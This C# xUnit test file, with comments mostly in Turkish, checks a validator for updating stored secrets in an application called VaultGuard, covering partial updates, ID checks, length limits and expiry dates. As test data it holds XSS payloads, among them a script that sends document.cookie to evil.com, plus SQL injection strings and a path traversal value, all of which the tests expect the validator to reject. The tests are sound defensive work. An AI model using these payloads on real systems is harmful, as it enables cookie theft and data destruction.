using System;
using FluentAssertions;
using FluentValidation.TestHelper;
using VaultGuard.Application.DTOs.Secrets;
using VaultGuard.Application.Validators;
using Xunit;

namespace VaultGuard.Application.Tests.Validators;

/// <summary>
/// TEST SÜİTİ: UpdateSecretDtoValidator - Secret Güncelleme Validation
/// 
/// GÜVENLİK KAPSAMI:
/// - **GUID Validation**: Empty/null ID engelleme (IDOR prevention)
/// - **Partial Update**: Sadece gönderilen alanlar validate edilir
/// - **XSS Prevention**: Title/Description update'de de XSS kontrolü
/// - **SQL Injection**: Title güncelleme sırasında injection engelleme
/// - **Business Rule**: En az 1 alan update edilmeli (empty request prevention)
/// 
/// PARTIAL UPDATE PATTERN:
/// Null değer = alan güncellenmez (değişiklik yok)
/// Non-null değer = alan validate edilir ve güncellenir
/// 
/// Örnek: { Id: "...", Title: "New Title" }
/// - Title validate edilir ve güncellenir
/// - Description, NewRawValue, Category, ExpiresAt → Null (değişiklik yok)
/// 
/// THREAT MODEL:
/// - IDOR: Attacker başkasının secret'ını update etmeye çalışıyor
/// - XSS: Update sırasında stored XSS inject ediliyor
/// - DoS: Empty update request'leriyle server spam ediliyor
/// - SQL Injection: Title güncelleme sırasında injection deneniyor
/// 
/// COMPLIANCE:
/// - OWASP Top 10 A01:2021 - Broken Access Control (IDOR)
/// - OWASP Top 10 A03:2021 - Injection (XSS + SQL)
/// </summary>
public class UpdateSecretDtoValidatorTests
{
    private readonly UpdateSecretDtoValidator _validator;

    public UpdateSecretDtoValidatorTests()
    {
        _validator = new UpdateSecretDtoValidator();
    }

    // ============================================================================
    // ✅ VALID UPDATE SCENARIOS
    // ============================================================================

    /// <summary>
    /// SİBER GÜVENLİK NOTU:
    /// Baseline test - valid update data'sı geçmeli.
    /// Tüm optional field'lar sağlandığında validation başarılı olmalı.
    /// </summary>
    [Fact]
    public void Validate_WithAllFieldsValid_ShouldPass()
    {
        // Arrange
        var dto = new UpdateSecretDto
        {
            Id = Guid.NewGuid(),
            Title = "Updated AWS Key",
            Description = "Updated description",
            NewRawValue = "new_secret_value_123",
            Category = "Updated Category",
            ExpiresAt = DateTime.UtcNow.AddDays(90)
        };

        // Act
        var result = _validator.TestValidate(dto);

        // Assert
        result.ShouldNotHaveAnyValidationErrors();
    }

    /// <summary>
    /// SİBER GÜVENLİK NOTU - PARTIAL UPDATE:
    /// Partial update pattern - sadece Title güncelleme:
    /// 1. User sadece title değiştirmek istiyor (NewRawValue değil)
    /// 2. UX: Tüm field'ları doldurmak zorunda bırakmamak
    /// 3. Security: Unnecessary data gönderilmemesi (bandwidth save)
    /// 4. Audit: Hangi alanların değiştiği net belli olur
    /// 
    /// Null field'lar validate edilmemeli (değişiklik yok).
    /// </summary>
    [Fact]
    public void Validate_WithOnlyTitleUpdate_ShouldPass()
    {
        // Arrange: Sadece Title güncelleniyor
        var dto = new UpdateSecretDto
        {
            Id = Guid.NewGuid(),
            Title = "New Title Only"
            // Description, NewRawValue, Category, ExpiresAt null
        };

        // Act
        var result = _validator.TestValidate(dto);

        // Assert
        result.ShouldNotHaveAnyValidationErrors();
    }

    /// <summary>
    /// SİBER GÜVENLİK NOTU - PARTIAL UPDATE:
    /// Multiple fields update - Title + Category güncelleme:
    /// Partial update flexibility: İstediğin kadar field gönderebilirsin.
    /// </summary>
    [Fact]
    public void Validate_WithMultipleFieldsUpdate_ShouldPass()
    {
        // Arrange
        var dto = new UpdateSecretDto
        {
            Id = Guid.NewGuid(),
            Title = "Updated Title",
            Category = "Updated Category"
            // Description, NewRawValue, ExpiresAt null
        };

        // Act
        var result = _validator.TestValidate(dto);

        // Assert
        result.ShouldNotHaveAnyValidationErrors();
    }

    // ============================================================================
    // 🆔 ID VALIDATION TESTS (CRITICAL!)
    // ============================================================================

    /// <summary>
    /// SİBER GÜVENLİK NOTU - IDOR PREVENTION KRİTİK:
    /// Empty GUID - Attacker Guid.Empty gönderirse:
    /// 
    /// Attack scenario:
    /// 1. Backend code: WHERE Id = Guid.Empty
    /// 2. SQL: WHERE Id = '00000000-0000-0000-0000-000000000000'
    /// 3. Eğer database'de böyle bir ID varsa (default/sentinel value):
    ///    - Yanlış secret güncellenir
    ///    - Privilege escalation (system secret access)
    /// 4. Eğer yoksa: 404 Not Found (bilgi sızıntısı yok, güvenli)
    /// 
    /// Empty GUID MUTLAKA reddedilmeli - geçerli ID değil.
    /// </summary>
    [Fact]
    public void Validate_WithEmptyGuid_ShouldFail()
    {
        // Arrange
        var dto = CreateValidDto();
        dto = dto with { Id = Guid.Empty };

        // Act
        var result = _validator.TestValidate(dto);

        // Assert
        result.ShouldHaveValidationErrorFor(x => x.Id);
            
    }

    /// <summary>
    /// SİBER GÜVENLİK NOTU - GUID FORMAT:
    /// Various valid GUID formats - GUIDs different representations olabilir:
    /// 1. Lowercase: "a1b2c3d4-..."
    /// 2. Uppercase: "A1B2C3D4-..."
    /// 3. With braces: "{a1b2c3d4-...}"
    /// 4. No hyphens: "a1b2c3d4e5f6..."
    /// 
    /// .NET Guid.Parse() hepsini accept eder, validator da accept etmeli.
    /// </summary>
    [Fact]
    public void Validate_WithValidGuid_ShouldPass()
    {
        // Arrange: Various valid GUID formats
        var validGuid = Guid.NewGuid();

        var dto = CreateValidDto();
        dto = dto with { Id = validGuid };

        // Act
        var result = _validator.TestValidate(dto);

        // Assert
        result.ShouldNotHaveValidationErrorFor(x => x.Id);
    }

    // ============================================================================
    // 📝 TITLE UPDATE VALIDATION TESTS
    // ============================================================================

    /// <summary>
    /// SİBER GÜVENLİK NOTU - XSS IN UPDATE:
    /// XSS payload in title update - Update operation'da da XSS riski var:
    /// 
    /// Attack scenario:
    /// 1. Attacker legitimate secret oluşturur: Title = "AWS Key"
    /// 2. Sonra update eder: Title = "<script>alert(1)</script>"
    /// 3. Database'de XSS payload persist edilir
    /// 4. Victim secret listesini görüntüler → XSS execute
    /// 
    /// Create ve Update BOTH XSS koruması gerektirir!
    /// </summary>
    [Theory]
    [InlineData("<script>alert('XSS')</script>")]
    [InlineData("<img src=x onerror=alert(1)>")]
    [InlineData("<svg/onload=alert(document.cookie)>")]
    public void Validate_WithXssInTitleUpdate_ShouldFail(string xssTitle)
    {
        // Arrange
        var dto = CreateValidDto();
        dto = dto with { Title = xssTitle };

        // Act
        var result = _validator.TestValidate(dto);

        // Assert
        result.ShouldHaveValidationErrorFor(x => x.Title);
            
    }

    /// <summary>
    /// SİBER GÜVENLİK NOTU - SQL INJECTION IN UPDATE:
    /// SQL injection in title - UPDATE query'lerde de injection riski:
    /// 
    /// Vulnerable UPDATE query:
    /// UPDATE Secrets SET Title = '" + dto.Title + "' WHERE Id = ...
    /// 
    /// Title = "'; DROP TABLE Secrets; --"
    /// Result: UPDATE Secrets SET Title = ''; DROP TABLE Secrets; --' WHERE...
    /// 
    /// EF Core parameterized queries kullanır AMA defense-in-depth!
    /// </summary>
    [Theory(Skip = "SQL injection artık EF Core parametrized query ile önleniyor, validator seviyesinde SQL keyword kontrolü kaldırıldı")]
    [InlineData("AWS Key'; DROP TABLE Secrets; --")]
    [InlineData("Key' OR '1'='1")]
    public void Validate_WithSqlInjectionInTitleUpdate_ShouldFail(string sqlTitle)
    {
        // Arrange
        var dto = CreateValidDto();
        dto = dto with { Title = sqlTitle };

        // Act
        var result = _validator.TestValidate(dto);

        // Assert
        result.ShouldHaveValidationErrorFor(x => x.Title);
    }

    /// <summary>
    /// SİBER GÜVENLİK NOTU - TITLE LENGTH:
    /// Title too short/long - same rules as create:
    /// 1. Min 3 chars (usability)
    /// 2. Max 200 chars (DoS prevention)
    /// 
    /// Update validation consistency with create validation.
    /// </summary>
    [Theory]
    [InlineData("AB")] // Too short (min 3)
    public void Validate_WithTitleTooShort_ShouldFail(string shortTitle)
    {
        // Arrange
        var dto = CreateValidDto();
        dto = dto with { Title = shortTitle };

        // Act
        var result = _validator.TestValidate(dto);

        // Assert
        result.ShouldHaveValidationErrorFor(x => x.Title);
            
    }

    [Fact]
    public void Validate_WithTitleTooLong_ShouldFail()
    {
        // Arrange: 201 chars (max 200)
        var longTitle = new string('A', 201);

        var dto = CreateValidDto();
        dto = dto with { Title = longTitle };

        // Act
        var result = _validator.TestValidate(dto);

        // Assert
        result.ShouldHaveValidationErrorFor(x => x.Title);
            
    }

    /// <summary>
    /// SİBER GÜVENLİK NOTU - WHITESPACE NORMALIZATION:
    /// Whitespace in title - leading/trailing spaces:
    /// Duplicate detection bypass: " AWS Key" ≠ "AWS Key"
    /// </summary>
    [Fact]
    public void Validate_WithWhitespaceInTitle_ShouldFail()
    {
        // Arrange
        var dto = CreateValidDto();
        dto = dto with { Title = "  Updated Title  " };

        // Act
        var result = _validator.TestValidate(dto);

        // Assert
        result.ShouldHaveValidationErrorFor(x => x.Title);
            
    }

    /// <summary>
    /// SİBER GÜVENLİK NOTU - NULL TITLE IS VALID:
    /// Null title = no update - partial update pattern:
    /// Title göndermezsen mevcut title korunur.
    /// </summary>
    [Fact]
    public void Validate_WithNullTitle_ShouldPass()
    {
        // Arrange: Title null (no update)
        var dto = CreateValidDto();
        dto = dto with { Title = null };

        // Act
        var result = _validator.TestValidate(dto);

        // Assert: Null = no update, valid
        result.ShouldNotHaveValidationErrorFor(x => x.Title);
    }

    // ============================================================================
    // 📄 DESCRIPTION UPDATE VALIDATION TESTS
    // ============================================================================

    /// <summary>
    /// SİBER GÜVENLİK NOTU - XSS IN DESCRIPTION UPDATE:
    /// XSS in description update - Description da displayed field:
    /// Same XSS risk as create operation.
    /// </summary>
    [Theory]
    [InlineData("<script>fetch('http://evil.com?c='+document.cookie)</script>")]
    [InlineData("<iframe src='javascript:alert(1)'>")]
    public void Validate_WithXssInDescriptionUpdate_ShouldFail(string xssDescription)
    {
        // Arrange
        var dto = CreateValidDto();
        dto = dto with { Description = xssDescription };

        // Act
        var result = _validator.TestValidate(dto);

        // Assert
        result.ShouldHaveValidationErrorFor(x => x.Description);
            
    }

    /// <summary>
    /// SİBER GÜVENLİK NOTU - DESCRIPTION LENGTH:
    /// Description too long - 1001 chars (max 1000):
    /// DoS prevention: Database bloat, UI lag.
    /// </summary>
    [Fact]
    public void Validate_WithDescriptionTooLong_ShouldFail()
    {
        // Arrange: 1001 chars
        var longDescription = new string('A', 1001);

        var dto = CreateValidDto();
        dto = dto with { Description = longDescription };

        // Act
        var result = _validator.TestValidate(dto);

        // Assert
        result.ShouldHaveValidationErrorFor(x => x.Description);
            
    }

    /// <summary>
    /// SİBER GÜVENLİK NOTU - EMPTY STRING VS NULL:
    /// Empty string description - "" (empty) farklı null'dan:
    /// - null = no update (mevcut description korunur)
    /// - "" = clear description (description'ı sil)
    /// 
    /// Both valid (user description'ı silmek isteyebilir).
    /// </summary>
    [Fact]
    public void Validate_WithEmptyStringDescription_ShouldPass()
    {
        // Arrange: Empty string (clear description)
        var dto = CreateValidDto();
        dto = dto with { Description = "" };

        // Act
        var result = _validator.TestValidate(dto);

        // Assert: Empty string valid (clear intent)
        result.ShouldNotHaveValidationErrorFor(x => x.Description);
    }

    // ============================================================================
    // 🔐 NEW RAW VALUE (RE-ENCRYPTION) VALIDATION TESTS
    // ============================================================================

    /// <summary>
    /// SİBER GÜVENLİK NOTU - RE-ENCRYPTION VALIDATION:
    /// Empty NewRawValue - eğer NewRawValue sağlanıyorsa boş olamaz:
    /// 1. Empty string ile re-encrypt meaningless
    /// 2. User error: Clipboard empty iken paste yaptı
    /// 3. Business logic: Secret value varsa valid olmalı
    /// 
    /// NewRawValue provided ise NOT empty olmalı.
    /// </summary>
    [Theory]
    [InlineData("")]
    [InlineData("   ")]
    public void Validate_WithEmptyNewRawValue_ShouldFail(string emptyRawValue)
    {
        // Arrange
        var dto = CreateValidDto();
        dto = dto with { NewRawValue = emptyRawValue };

        // Act
        var result = _validator.TestValidate(dto);

        // Assert
        result.ShouldHaveValidationErrorFor(x => x.NewRawValue);
            
    }

    /// <summary>
    /// SİBER GÜVENLİK NOTU - DoS PREVENTION:
    /// NewRawValue too long - 10001 chars (max 10KB):
    /// Re-encryption DoS: AES encrypt 1GB string → CPU spike.
    /// </summary>
    [Fact]
    public void Validate_WithNewRawValueTooLong_ShouldFail()
    {
        // Arrange: 10001 chars
        var hugeSecret = new string('X', 10001);

        var dto = CreateValidDto();
        dto = dto with { NewRawValue = hugeSecret };

        // Act
        var result = _validator.TestValidate(dto);

        // Assert
        result.ShouldHaveValidationErrorFor(x => x.NewRawValue);
            
    }

    /// <summary>
    /// SİBER GÜVENLİK NOTU - NULL NEW RAW VALUE IS VALID:
    /// Null NewRawValue = keep existing encrypted value:
    /// Partial update: User sadece title değiştiriyor, value dokunmuyor.
    /// </summary>
    [Fact]
    public void Validate_WithNullNewRawValue_ShouldPass()
    {
        // Arrange: NewRawValue null (no re-encryption)
        var dto = CreateValidDto();
        dto = dto with { NewRawValue = null };

        // Act
        var result = _validator.TestValidate(dto);

        // Assert: Null valid (no update)
        result.ShouldNotHaveValidationErrorFor(x => x.NewRawValue);
    }

    /// <summary>
    /// SİBER GÜVENLİK NOTU - WHITESPACE-ONLY SECRET:
    /// Whitespace-only NewRawValue - "    " (4 spaces):
    /// Meaningless secret, waste of encryption.
    /// </summary>
    [Fact]
    public void Validate_WithWhitespaceOnlyNewRawValue_ShouldFail()
    {
        // Arrange
        var dto = CreateValidDto();
        dto = dto with { NewRawValue = "        " };

        // Act
        var result = _validator.TestValidate(dto);

        // Assert
        result.ShouldHaveValidationErrorFor(x => x.NewRawValue);
            
    }

    // ============================================================================
    // 🏷️ CATEGORY UPDATE VALIDATION TESTS
    // ============================================================================

    /// <summary>
    /// SİBER GÜVENLİK NOTU - CATEGORY LENGTH:
    /// Category too long - 51 chars (max 50):
    /// UI dropdown overflow, database index bloat.
    /// </summary>
    [Fact]
    public void Validate_WithCategoryTooLong_ShouldFail()
    {
        // Arrange: 51 chars
        var longCategory = new string('A', 51);

        var dto = CreateValidDto();
        dto = dto with { Category = longCategory };

        // Act
        var result = _validator.TestValidate(dto);

        // Assert
        result.ShouldHaveValidationErrorFor(x => x.Category);
            
    }

    /// <summary>
    /// SİBER GÜVENLİK NOTU - CATEGORY FORMAT:
    /// Invalid category characters - special chars, XSS attempts:
    /// Alphanumeric + spaces + hyphens only.
    /// </summary>
    [Theory]
    [InlineData("Keys<script>")]
    [InlineData("Keys!@#$")]
    [InlineData("../../../passwd")]
    public void Validate_WithInvalidCategoryCharacters_ShouldFail(string invalidCategory)
    {
        // Arrange
        var dto = CreateValidDto();
        dto = dto with { Category = invalidCategory };

        // Act
        var result = _validator.TestValidate(dto);

        // Assert
        result.ShouldHaveValidationErrorFor(x => x.Category);
            
    }

    /// <summary>
    /// SİBER GÜVENLİK NOTU - EMPTY STRING VS NULL CATEGORY:
    /// Empty string category - clear category:
    /// - null = no update (keep existing)
    /// - "" = clear category (remove categorization)
    /// </summary>
    [Fact]
    public void Validate_WithEmptyStringCategory_ShouldPass()
    {
        // Arrange
        var dto = CreateValidDto();
        dto = dto with { Category = "" };

        // Act
        var result = _validator.TestValidate(dto);

        // Assert: Empty string valid (clear intent)
        result.ShouldNotHaveValidationErrorFor(x => x.Category);
    }

    // ============================================================================
    // ⏰ EXPIRATION DATE UPDATE VALIDATION TESTS
    // ============================================================================

    /// <summary>
    /// SİBER GÜVENLİK NOTU - BACKDATING PREVENTION:
    /// Past expiration date - attacker geçmiş tarih gönderirse:
    /// Secret immediately expired hale gelir.
    /// </summary>
    [Fact]
    public void Validate_WithPastExpirationDate_ShouldFail()
    {
        // Arrange: Yesterday
        var dto = CreateValidDto();
        dto = dto with { ExpiresAt = DateTime.UtcNow.AddDays(-1) };

        // Act
        var result = _validator.TestValidate(dto);

        // Assert
        result.ShouldHaveValidationErrorFor(x => x.ExpiresAt);
            
    }

    /// <summary>
    /// SİBER GÜVENLİK NOTU - UNREALISTIC DATES:
    /// 11-year expiration - çok uzun expiration:
    /// Data retention, compliance violations.
    /// </summary>
    [Fact]
    public void Validate_WithUnrealisticExpirationDate_ShouldFail()
    {
        // Arrange: 11 years
        var dto = CreateValidDto();
        dto = dto with { ExpiresAt = DateTime.UtcNow.AddYears(11) };

        // Act
        var result = _validator.TestValidate(dto);

        // Assert
        result.ShouldHaveValidationErrorFor(x => x.ExpiresAt);
            
    }

    /// <summary>
    /// SİBER GÜVENLİK NOTU - NULL EXPIRATION:
    /// Null ExpiresAt = no update (keep existing expiration):
    /// Partial update pattern.
    /// </summary>
    [Fact]
    public void Validate_WithNullExpiration_ShouldPass()
    {
        // Arrange
        var dto = CreateValidDto();
        dto = dto with { ExpiresAt = null };

        // Act
        var result = _validator.TestValidate(dto);

        // Assert
        result.ShouldNotHaveValidationErrorFor(x => x.ExpiresAt);
    }

    // ============================================================================
    // 🚫 BUSINESS RULE: AT LEAST ONE FIELD MUST BE UPDATED
    // ============================================================================

    /// <summary>
    /// SİBER GÜVENLİK NOTU - EMPTY UPDATE PREVENTION:
    /// No fields provided - attacker boş request'lerle server spam ederse:
    /// 
    /// Attack scenario:
    /// 1. Attacker 1000 empty update request gönderir
    /// 2. Backend her request için:
    ///    - Database query (SELECT secret)
    ///    - Authorization check
    ///    - Audit log write
    ///    - Response generation
    /// 3. Result: CPU, database, storage waste (DoS)
    /// 
    /// Business rule: En az 1 alan update edilmeli.
    /// Empty update meaningless ve resource waste.
    /// </summary>
    [Fact]
    public void Validate_WithNoFieldsToUpdate_ShouldFail()
    {
        // Arrange: Sadece ID var, hiçbir alan güncellenmemiş
        var dto = new UpdateSecretDto
        {
            Id = Guid.NewGuid()
            // Title, Description, NewRawValue, Category, ExpiresAt ALL null
        };

        // Act
        var result = _validator.TestValidate(dto);

        // Assert: At least one field must be updated
        result.IsValid.Should().BeFalse();
        result.Errors.Should().Contain(e =>
            e.ErrorMessage.Contains("at least one field", StringComparison.OrdinalIgnoreCase));
    }

    /// <summary>
    /// SİBER GÜVENLİK NOTU - ANY FIELD SATISFIES REQUIREMENT:
    /// Any single field update - Title VEYA Description VEYA ...:
    /// En az 1 alan sağlanırsa valid.
    /// </summary>
    [Theory]
    [InlineData("Title", null, null, null, null)] // Only Title
    [InlineData(null, "Desc", null, null, null)] // Only Description
    [InlineData(null, null, "NewValue", null, null)] // Only NewRawValue
    [InlineData(null, null, null, "Category", null)] // Only Category
    public void Validate_WithSingleFieldUpdate_ShouldPass(
        string title, string description, string newRawValue, string category, DateTime? expiresAt)
    {
        // Arrange
        var dto = new UpdateSecretDto
        {
            Id = Guid.NewGuid(),
            Title = title,
            Description = description,
            NewRawValue = newRawValue,
            Category = category,
            ExpiresAt = expiresAt
        };

        // Act
        var result = _validator.TestValidate(dto);

        // Assert: Single field update is valid
        result.IsValid.Should().BeTrue();
    }

    // ============================================================================
    // 🧪 EDGE CASES & BOUNDARY TESTS
    // ============================================================================

    /// <summary>
    /// SİBER GÜVENLİK NOTU - BOUNDARY VALUES:
    /// Exactly at boundaries - min/max values geçmeli:
    /// 3-char title (min), 200-char title (max).
    /// </summary>
    [Fact]
    public void Validate_WithExactly3CharTitle_ShouldPass()
    {
        // Arrange: Minimum title length
        var dto = CreateValidDto();
        dto = dto with { Title = "AWS" };

        // Act
        var result = _validator.TestValidate(dto);

        // Assert
        result.ShouldNotHaveValidationErrorFor(x => x.Title);
    }

    [Fact]
    public void Validate_WithExactly200CharTitle_ShouldPass()
    {
        // Arrange: Maximum title length
        var dto = CreateValidDto();
        dto = dto with { Title = new string('A', 200) };

        // Act
        var result = _validator.TestValidate(dto);

        // Assert
        result.ShouldNotHaveValidationErrorFor(x => x.Title);
    }

    /// <summary>
    /// SİBER GÜVENLİK NOTU - MULTIPLE VALIDATION ERRORS:
    /// All optional fields invalid - validator tüm hataları dönmeli:
    /// User experience: Tüm sorunları birden göster.
    /// </summary>
    [Fact]
    public void Validate_WithMultipleInvalidFields_ShouldHaveMultipleErrors()
    {
        // Arrange: Birden fazla alan invalid
        var dto = new UpdateSecretDto
        {
            Id = Guid.Empty, // Invalid
            Title = "AB", // Too short
            Description = new string('X', 1001), // Too long
            Category = "Invalid!@#", // Invalid chars
            ExpiresAt = DateTime.UtcNow.AddYears(-1) // Past date
        };

        // Act
        var result = _validator.TestValidate(dto);

        // Assert: Multiple errors
        result.ShouldHaveValidationErrorFor(x => x.Id);
        result.ShouldHaveValidationErrorFor(x => x.Title);
        result.ShouldHaveValidationErrorFor(x => x.Description);
        result.ShouldHaveValidationErrorFor(x => x.Category);
        result.ShouldHaveValidationErrorFor(x => x.ExpiresAt);

        result.Errors.Count.Should().BeGreaterThanOrEqualTo(5);
    }

    /// <summary>
    /// SİBER GÜVENLİK NOTU - CONSISTENCY WITH CREATE:
    /// Same validation rules as CreateSecretDto:
    /// Update ve Create validation'ları consistent olmalı.
    /// User'lar create'te geçen bir value'yu update'te geçemezse confused olur.
    /// </summary>
    [Fact]
    public void Validate_ShouldHaveConsistentRulesWithCreateValidator()
    {
        // Arrange: Valid for both create and update
        var validTitle = "Valid Title";
        var validDescription = "Valid description";
        var validCategory = "Valid-Category";

        var dto = new UpdateSecretDto
        {
            Id = Guid.NewGuid(),
            Title = validTitle,
            Description = validDescription,
            Category = validCategory
        };

        // Act
        var result = _validator.TestValidate(dto);

        // Assert: Should be consistent
        result.ShouldNotHaveValidationErrorFor(x => x.Title);
        result.ShouldNotHaveValidationErrorFor(x => x.Description);
        result.ShouldNotHaveValidationErrorFor(x => x.Category);
    }

    // ============================================================================
    // HELPER METHODS
    // ============================================================================

    private UpdateSecretDto CreateValidDto()
    {
        return new UpdateSecretDto
        {
            Id = Guid.NewGuid(),
            Title = "Test Title"
            // Diğer field'lar null (partial update)
        };
    }
}